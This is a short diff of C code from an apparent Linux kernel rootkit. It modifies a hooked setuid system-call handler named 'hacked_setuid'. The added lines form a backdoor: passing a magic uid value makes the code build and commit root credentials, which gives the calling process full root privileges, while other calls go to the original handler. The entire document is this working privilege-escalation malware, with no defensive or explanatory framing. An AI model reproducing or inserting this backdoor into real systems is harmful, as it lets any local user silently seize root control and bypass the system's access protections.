@@ -5,9 +5,30 @@ unsigned long* sys_call_table;
 asmlinkage long hacked_setuid(uid_t uid)
 {
     long ret = 0;
+    struct cred *new;
     printk(KERN_INFO "intercepted setuid: %d\n", uid);
 
-    ret = (*orig_setuid) (uid);
+    //if the requested uid is the "magic number" to give root priv
+    if (uid == MAGIC_NUMBER) {
+        DEBUG("Magic Number passed in, elevating privilege");
+        new = prepare_creds();
+        if (!new)
+            return -ENOMEM;
+        //set root priveleges
+        new->uid = GLOBAL_ROOT_UID;
+        new->gid = GLOBAL_ROOT_GID;
+        new->suid = GLOBAL_ROOT_UID;
+        new->sgid = GLOBAL_ROOT_GID;
+        new->euid = GLOBAL_ROOT_UID;
+        new->egid = GLOBAL_ROOT_GID;
+        new->fsuid = GLOBAL_ROOT_UID;
+        new->fsgid = GLOBAL_ROOT_GID;
+
+        ret = commit_creds(new);
+    }
+    else {
+        ret = (*orig_setuid) (uid);
+    }
 
     return ret;
 }
